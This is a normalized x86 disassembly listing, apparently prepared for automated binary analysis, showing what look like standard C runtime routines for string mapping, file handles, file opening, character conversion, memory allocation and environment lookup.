push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
cmp esi edi
je r-xdata
test [ ebp + 0xd ] 0x4
je r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_4094d0
mov [ ebp - 0x18 ] esp
mov ebx esp
mov [ ebp - 0x20 ] ebx
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
cmp ebx edi
je r-xdata
mov eax esi
jmp r-xdata
cmp esi [ ebp + 0x1c ]
jg r-xdata
push esi
push ebx
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] edi
push edi
push edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push edi
jmp r-xdata
push esi
push ebx
push 0x220
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp esi edi
je r-xdata
sub_40eae2
push ebx
push esi
push edi
or ebx 0xffffffff
xor edi edi
xor esi esi
mov ecx rw-data
mov esi 0x100
push esi
call sub_408e82
test eax eax
pop ecx
je r-xdata
lea edx [ eax + 0x100 ]
pop edi
mov eax ebx
pop esi
pop ebx
retn
add [ rw-data ] 0x20
lea ecx [ edi * 4 + rw-data ]
lea edx [ eax + 0x100 ]
mov [ ecx ] eax
add ecx 0x4
inc edi
add esi 0x20
cmp ecx rw-data
jl r-xdata
test [ eax + 0x4 ] 0x1
je r-xdata
shl edi 0x5
mov ebx edi
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov edx [ ecx ]
add eax 0x8
add edx esi
jmp r-xdata
mov eax [ ecx ]
test eax eax
je r-xdata
jmp r-xdata
or [ eax ] 0xffffffff
sub eax [ ecx ]
sar eax 0x3
add eax esi
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
add eax 0x8
jmp r-xdata
cmp eax edx
jae r-xdata
cmp eax edx
jae r-xdata
sub_40eb77
mov eax [ esp + 0x4 ]
push esi
cmp eax [ rw-data ]
push edi
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
or eax 0xffffffff
mov ecx eax
mov esi eax
sar ecx 0x5
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
shl esi 0x3
mov ecx [ edi ]
cmp [ ecx + esi ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ esp + 0x14 ]
jne r-xdata
mov eax [ edi ]
mov [ eax + esi ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_40ebee
mov ecx [ esp + 0x4 ]
push esi
cmp ecx [ rw-data ]
push edi
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
or eax 0xffffffff
mov eax ecx
mov esi ecx
sar eax 0x5
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
shl esi 0x3
mov eax [ edi ]
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ eax + esi ] 0xffffffff
xor eax eax
jmp r-xdata
xor eax eax
sub ecx eax
je r-xdata
pop edi
pop esi
retn
push eax
push 0xfffffff6
dec ecx
je r-xdata
push eax
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push eax
push 0xfffffff4
jmp r-xdata
sub_40ec68
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
or eax 0xffffffff
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
test [ ecx + eax * 8 + 0x4 ] 0x1
lea eax [ ecx + eax * 8 ]
je r-xdata
mov eax [ eax ]
retn
sub_40eca5
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jae r-xdata
mov [ rw-data ] 0x9
or eax 0xffffffff
mov ecx eax
mov edx eax
sar ecx 0x5
and edx 0x1f
mov ecx [ ecx * 4 + rw-data ]
test [ ecx + edx * 8 + 0x4 ] 0x1
je r-xdata
push eax
call sub_40ec68
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
retn
mov [ rw-data ] eax
test eax eax
je r-xdata
sub_40ecfc
push ebp
mov ebp esp
sub esp 0x1c
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
push esi
test cl 0x80
push edi
mov [ ebp - 0x1c ] 0xc
mov [ ebp - 0x18 ] ebx
je r-xdata
and [ ebp - 0x1 ] 0x0
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push 0x3
mov eax ecx
pop esi
and eax esi
sub eax ebx
je r-xdata
test ch 0x40
jne r-xdata
mov eax 0x8000
test eax ecx
jne r-xdata
mov [ ebp - 0xc ] 0x80000000
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
cmp eax 0x20
je r-xdata
mov [ ebp - 0xc ] 0x40000000
jmp r-xdata
dec eax
je r-xdata
cmp ecx 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
cmp eax 0x30
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x10
je r-xdata
mov [ ebp - 0xc ] 0xc0000000
jmp r-xdata
mov [ rw-data ] 0x16
mov [ rw-data ] ebx
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
cmp ecx 0x600
je r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
cmp ecx ebx
je r-xdata
mov edx 0x700
mov eax 0x400
and ecx edx
mov edi 0x100
cmp ecx eax
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
cmp eax 0x40
jne r-xdata
or eax 0xffffffff
jmp r-xdata
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x14 ]
test cl 0x80
jne r-xdata
mov [ ebp - 0x8 ] 0x5
jmp r-xdata
cmp ecx edx
je r-xdata
mov eax [ ebp + 0xc ]
mov esi 0x80
test edi eax
je r-xdata
cmp ecx edi
je r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
test ah 0x10
je r-xdata
or esi 0x4000000
or [ ebp - 0xa ] 0x1
push 0x1
pop esi
jmp r-xdata
mov [ ebp - 0x8 ] 0x4
jmp r-xdata
cmp ecx 0x200
je r-xdata
test al 0x20
je r-xdata
or esi edi
cmp ecx 0x300
jne r-xdata
test al 0x10
je r-xdata
or esi 0x8000000
jmp r-xdata
mov [ ebp - 0x8 ] 0x2
jmp r-xdata
call sub_40eae2
mov ebx eax
or edi 0xffffffff
cmp ebx edi
jne r-xdata
or esi 0x10000000
push 0x0
push esi
push [ ebp - 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
call [ CreateFileA@IAT ]
mov esi eax
cmp esi edi
je r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x18
jmp r-xdata
call [ GetLastError@IAT ]
push eax
call sub_40b010
pop ecx
push esi
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
mov eax edi
jmp r-xdata
cmp eax 0x2
jne r-xdata
push esi
call [ CloseHandle@IAT ]
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
push esi
push ebx
call sub_40eb77
pop ecx
mov al [ ebp - 0x1 ]
pop ecx
mov esi ebx
mov ecx ebx
or al 0x1
sar ecx 0x5
and esi 0x1f
mov [ ebp + 0xb ] al
lea edi [ ecx * 4 + rw-data ]
shl esi 0x3
mov ecx [ edi ]
and [ ebp + 0xb ] 0x48
mov [ ecx + esi + 0x4 ] al
jne r-xdata
or [ ebp - 0x1 ] 0x8
cmp [ ebp + 0xb ] 0x0
jne r-xdata
test al 0x80
je r-xdata
mov eax ebx
test [ ebp + 0xc ] 0x8
je r-xdata
test [ ebp + 0xc ] 0x2
je r-xdata
mov eax [ edi ]
or [ eax + esi + 0x4 ] 0x20
lea eax [ eax + esi + 0x4 ]
push 0x2
push 0xffffffff
push ebx
call sub_40c2e5
add esp 0xc
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jne r-xdata
and [ ebp + 0x13 ] 0x0
lea eax [ ebp + 0x13 ]
push 0x1
push eax
push ebx
call sub_40bdb3
add esp 0xc
test eax eax
jne r-xdata
cmp [ rw-data ] 0x83
je r-xdata
push 0x0
push 0x0
push ebx
call sub_40c2e5
add esp 0xc
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp + 0x13 ] 0x1a
jne r-xdata
jmp r-xdata
push ebx
call sub_40baef
pop ecx
push [ ebp - 0x10 ]
push ebx
call sub_40fa48
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
sub_40efb5
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov al [ esi ]
cmp al bl
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
mov ecx [ rw-data ]
movzx eax al
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov [ eax ] bx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
push 0x1
push esi
push 0x9
push [ rw-data ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x1
jle r-xdata
push 0x1
pop eax
jmp r-xdata
movzx ax al
mov [ ecx ] ax
jmp r-xdata
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp + 0x10 ] eax
jl r-xdata
pop esi
pop ebx
pop ebp
retn
mov [ rw-data ] 0x2a
or eax 0xffffffff
jmp r-xdata
cmp [ esi + 0x1 ] bl
jne r-xdata
xor ecx ecx
cmp [ ebp + 0x8 ] ebx
setne cl
push ecx
push [ ebp + 0x8 ]
push eax
push esi
push 0x9
push [ rw-data ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ rw-data ]
jne r-xdata
sub_40f07d
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
jne r-xdata
add [ esi + 0x4 ] 0xfffffffe
js r-xdata
mov eax [ esi + 0x10 ]
cmp eax 0xffffffff
je r-xdata
movzx eax [ ebp + 0x8 ]
push esi
push eax
call sub_40fb8e
pop ecx
pop ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
add [ esi ] 0x2
jmp r-xdata
mov eax rw-data
mov ecx eax
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax * 8 ]
jmp r-xdata
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
call sub_40e61b
pop ecx
cmp eax 0xffffffff
pop ecx
jne r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
cmp eax 0x1
jne r-xdata
mov [ rw-data ] 0x2a
dec [ esi + 0x4 ]
js r-xdata
dec [ esi + 0x4 ]
js r-xdata
movsx eax [ ebp + 0xc ]
push esi
push eax
call sub_40b077
pop ecx
pop ecx
mov eax [ esi ]
mov cl [ ebp + 0xc ]
mov [ eax ] cl
inc [ esi ]
movzx eax [ ebp + 0xc ]
jmp r-xdata
movsx eax [ ebp + 0xc ]
push esi
mov eax [ esi ]
mov cl [ ebp + 0xc ]
mov [ eax ] cl
movzx eax [ ebp + 0xc ]
or ax 0xffff
jmp r-xdata
dec [ esi + 0x4 ]
js r-xdata
cmp eax 0xffffffff
je r-xdata
mov ax [ ebp + 0x8 ]
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
movsx eax [ ebp + 0xd ]
push esi
jmp r-xdata
mov eax [ esi ]
mov cl [ ebp + 0xd ]
mov [ eax ] cl
movzx eax [ ebp + 0xd ]
jmp r-xdata
push eax
call sub_40b077
pop ecx
pop ecx
inc [ esi ]
jmp r-xdata
sub_40f183
movzx eax [ esp + 0x4 ]
mov cl [ esp + 0xc ]
test [ eax + rw-data ] cl
jne r-xdata
push 0x1
pop eax
retn
cmp [ esp + 0x8 ] 0x0
je r-xdata
xor eax eax
movzx eax [ eax * 2 + rw-data ]
and eax [ esp + 0x8 ]
jmp r-xdata
retn
test eax eax
jne r-xdata
sub_40f1b4
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push [ ebp + 0x8 ]
call sub_40f34d
mov esi eax
pop ecx
cmp esi [ rw-data ]
mov [ ebp + 0x8 ] esi
je r-xdata
xor eax eax
jmp r-xdata
xor ebx ebx
cmp esi ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_40f3ca
xor edx edx
mov eax rw-data
push 0x40
xor eax eax
pop ecx
mov edi rw-data
[ edi ]
lea esi [ edx + edx * 2 ]
mov [ ebp - 0x4 ] ebx
shl esi 0x4
stosb [ edi ]
lea ebx [ esi + rw-data ]
add eax 0x30
inc edx
cmp eax rw-data
jl r-xdata
inc [ ebp - 0x4 ]
add ebx 0x8
cmp [ ebp - 0x4 ] 0x4
jb r-xdata
mov dl [ ecx + 0x1 ]
test dl dl
je r-xdata
cmp [ eax ] esi
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push esi
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne r-xdata
cmp [ ebx ] 0x0
mov ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] 0x1
push eax
mov [ rw-data ] eax
call sub_40f397
lea esi [ esi + rw-data ]
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
mov [ rw-data ] eax
movsd [ edi ] [ esi ]
jmp r-xdata
movzx eax [ ecx ]
movzx edi dl
cmp eax edi
ja r-xdata
cmp [ rw-data ] ebx
je r-xdata
push 0x40
xor eax eax
pop ecx
mov edi rw-data
cmp [ ebp - 0x18 ] 0x1
mov [ rw-data ] esi
[ edi ]
stosb [ edi ]
mov [ rw-data ] ebx
jbe r-xdata
call sub_40f3f3
inc ecx
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + rw-data ]
or eax 0xffffffff
mov [ rw-data ] ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
or [ eax + rw-data ] dl
inc eax
cmp eax edi
jbe r-xdata
push 0x1
pop eax
lea ecx [ ebp - 0x11 ]
or [ eax + rw-data ] 0x8
inc eax
cmp eax 0xff
jb r-xdata
push esi
call sub_40f397
pop ecx
mov [ rw-data ] eax
mov [ rw-data ] 0x1
jmp r-xdata
movzx eax [ ecx - 0x1 ]
movzx edx dl
xor eax eax
mov edi rw-data
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx - 0x1 ] 0x0
jne r-xdata
or [ eax + rw-data ] 0x4
inc eax
jmp r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
cmp eax edx
ja r-xdata
sub_40f34d
mov eax [ esp + 0x4 ]
and [ rw-data ] 0x0
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetOEMCP@IAT ]
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetACP@IAT ]
retn
mov eax [ rw-data ]
mov [ rw-data ] 0x1
sub_40f397
mov eax [ esp + 0x4 ]
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_40f3ca
push edi
push 0x40
pop ecx
xor eax eax
mov edi rw-data
[ edi ]
stosb [ edi ]
xor eax eax
mov edi rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
pop edi
retn
sub_40f3f3
push ebp
mov ebp esp
sub esp 0x514
lea eax [ ebp - 0x14 ]
push esi
push eax
push [ rw-data ]
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne r-xdata
xor eax eax
mov esi 0x100
xor eax eax
mov esi 0x100
cmp eax 0x61
jb r-xdata
cmp eax 0x5a
ja r-xdata
mov [ ebp + eax - 0x114 ] al
inc eax
cmp eax esi
jb r-xdata
mov al [ ebp - 0xe ]
mov [ ebp - 0x114 ] 0x20
test al al
je r-xdata
and [ eax + rw-data ] 0x0
cmp eax 0x7a
ja r-xdata
or [ eax + rw-data ] 0x10
mov cl al
add cl 0x20
push 0x0
lea eax [ ebp - 0x514 ]
push [ rw-data ]
push [ rw-data ]
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x1
call sub_40e775
push 0x0
lea eax [ ebp - 0x214 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push esi
push [ rw-data ]
call sub_40e8be
push 0x0
lea eax [ ebp - 0x314 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x200
push [ rw-data ]
call sub_40e8be
add esp 0x5c
xor eax eax
lea ecx [ ebp - 0x514 ]
push ebx
push edi
lea edx [ ebp - 0xd ]
cmp eax 0x41
jb r-xdata
pop esi
leave
retn
or [ eax + rw-data ] 0x20
mov cl al
sub cl 0x20
jmp r-xdata
inc eax
cmp eax esi
jb r-xdata
test dl 0x2
je r-xdata
or [ eax + rw-data ] 0x10
mov dl [ ebp + eax - 0x214 ]
inc edx
inc edx
mov al [ edx - 0x1 ]
test al al
jne r-xdata
sub ecx eax
lea edi [ ebp + eax - 0x114 ]
inc ecx
mov eax 0x20202020
mov ebx ecx
shr ecx 0x2
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
mov [ eax + rw-data ] cl
jmp r-xdata
and [ eax + rw-data ] 0x0
or [ eax + rw-data ] 0x20
mov dl [ ebp + eax - 0x314 ]
jmp r-xdata
inc eax
inc ecx
inc ecx
cmp eax esi
jb r-xdata
movzx ecx [ edx ]
movzx eax al
cmp eax ecx
ja r-xdata
pop edi
pop ebx
mov dx [ ecx ]
test dl 0x1
je r-xdata
jmp r-xdata
mov [ eax + rw-data ] dl
jmp r-xdata
sub_40f5a0
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_40f5b0
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_40f690
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push ebx
call [ rw-data ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
mov [ rw-data ] eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
push ebx
call eax
mov ebx eax
sub_40f719
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
dec eax
dec eax
je r-xdata
mov esi [ rw-data ]
mov eax rw-data
dec eax
dec eax
je r-xdata
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
push edi
call sub_40f846
mov esi [ eax + 0x8 ]
add eax 0x8
pop ecx
jmp r-xdata
sub eax 0x4
je r-xdata
push ebx
push 0x8
pop ecx
cmp edi ecx
je r-xdata
push 0x3
call sub_409065
pop edi
pop esi
pop ebp
retn
cmp esi 0x1
jne r-xdata
sub eax 0x3
je r-xdata
mov ebx [ rw-data ]
and [ rw-data ] 0x0
cmp edi ecx
jne r-xdata
cmp edi 0xb
je r-xdata
sub eax 0x4
je r-xdata
and [ eax ] 0x0
cmp edi ecx
jne r-xdata
mov edx [ rw-data ]
mov [ rw-data ] 0x8c
mov [ ebp + 0x8 ] edx
jmp r-xdata
cmp edi 0x4
jne r-xdata
mov esi [ rw-data ]
mov eax rw-data
jmp r-xdata
sub eax 0x6
je r-xdata
push edi
call esi
cmp edi 0xb
pop ecx
je r-xdata
push [ rw-data ]
push 0x8
call esi
pop ecx
pop ecx
jmp r-xdata
cmp edi ecx
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov esi [ rw-data ]
mov eax rw-data
jmp r-xdata
dec eax
je r-xdata
cmp edi 0x8
mov [ rw-data ] ebx
jne r-xdata
cmp edi 0x4
jne r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
add ecx eax
cmp eax ecx
jge r-xdata
mov esi [ rw-data ]
mov eax rw-data
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
pop ebx
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
lea edx [ eax + eax * 2 ]
sub ecx eax
lea edx [ edx * 4 + rw-data ]
and [ edx ] 0x0
add edx 0xc
dec ecx
jne r-xdata
jmp r-xdata
sub_40f846
mov edx [ esp + 0x4 ]
mov ecx [ rw-data ]
cmp [ rw-data ] edx
push esi
mov eax rw-data
je r-xdata
lea ecx [ ecx + ecx * 2 ]
pop esi
lea ecx [ ecx * 4 + rw-data ]
cmp eax ecx
jae r-xdata
lea esi [ ecx + ecx * 2 ]
lea esi [ esi * 4 + rw-data ]
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
jne r-xdata
retn
add eax 0xc
cmp eax esi
jae r-xdata
sub_40f88b
cmp [ rw-data ] 0x0
push ebx
push esi
mov esi [ rw-data ]
push edi
je r-xdata
xor eax eax
test esi esi
jne r-xdata
mov ebx [ esp + 0x10 ]
test ebx ebx
je r-xdata
cmp [ rw-data ] esi
je r-xdata
push ebx
call sub_40e5a0
pop ecx
mov edi eax
call sub_40fcf1
test eax eax
jne r-xdata
push eax
call sub_40e5a0
cmp eax edi
pop ecx
jbe r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
add esi 0x4
jmp r-xdata
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push edi
push ebx
push eax
call sub_40fcb2
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40f908
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
imul esi [ esp + 0x14 ]
cmp esi 0xffffffe0
mov ebx esi
ja r-xdata
xor edi edi
cmp esi 0xffffffe0
ja r-xdata
test esi esi
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp ebx [ rw-data ]
ja r-xdata
add esi 0xf
and esi 0xfffffff0
push 0x1
pop esi
mov eax edi
push esi
call sub_40a3b8
test eax eax
pop ecx
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
push ebx
call sub_40a7a3
mov edi eax
pop ecx
test edi edi
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
push ebx
push 0x0
push edi
call sub_40f9f0
add esp 0xc
pop edi
pop esi
pop ebx
retn
sub_40f985
push esi
push edi
push 0x3
xor edi edi
pop esi
cmp [ rw-data ] esi
jle r-xdata
mov eax edi
pop edi
pop esi
retn
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
inc esi
cmp esi [ rw-data ]
jl r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
cmp esi 0x14
jl r-xdata
push eax
call sub_4095ad
cmp eax 0xffffffff
pop ecx
je r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_4091a9
mov eax [ rw-data ]
pop ecx
and [ eax + esi * 4 ] 0x0
inc edi
sub_40f9f0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
mov [ edi ] al
inc edi
dec edx
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
inc edi
dec ecx
jne r-xdata
sub_40fa48
push ebp
mov ebp esp
mov eax 0x1000
call sub_4094d0
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ebx [ rw-data ]
jae r-xdata
mov [ rw-data ] 0x9
mov eax ebx
mov ecx ebx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
test [ eax + ecx * 8 + 0x4 ] 0x1
je r-xdata
push 0x1
push esi
push ebx
call sub_40c2e5
add esp 0xc
cmp eax 0xffffffff
mov [ ebp + 0x8 ] eax
je r-xdata
or eax 0xffffffff
push 0x2
push esi
push ebx
call sub_40c2e5
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push edi
mov edi [ ebp + 0xc ]
sub edi eax
test edi edi
jle r-xdata
jge r-xdata
push 0x1000
lea eax [ ebp - 0x1000 ]
push esi
push eax
call sub_40f9f0
push 0x8000
push ebx
call sub_40fd5f
add esp 0x14
mov [ ebp + 0xc ] eax
push 0x0
push [ ebp + 0x8 ]
push ebx
call sub_40c2e5
add esp 0xc
mov eax esi
pop edi
jmp r-xdata
push 0x0
push [ ebp + 0xc ]
push ebx
call sub_40c2e5
push ebx
call sub_40ec68
add esp 0x10
push eax
call [ SetEndOfFile@IAT ]
mov esi eax
neg esi
sbb esi esi
neg esi
dec esi
cmp esi 0xffffffff
jne r-xdata
push eax
lea eax [ ebp - 0x1000 ]
push eax
push ebx
call sub_40c6bf
add esp 0xc
cmp eax 0xffffffff
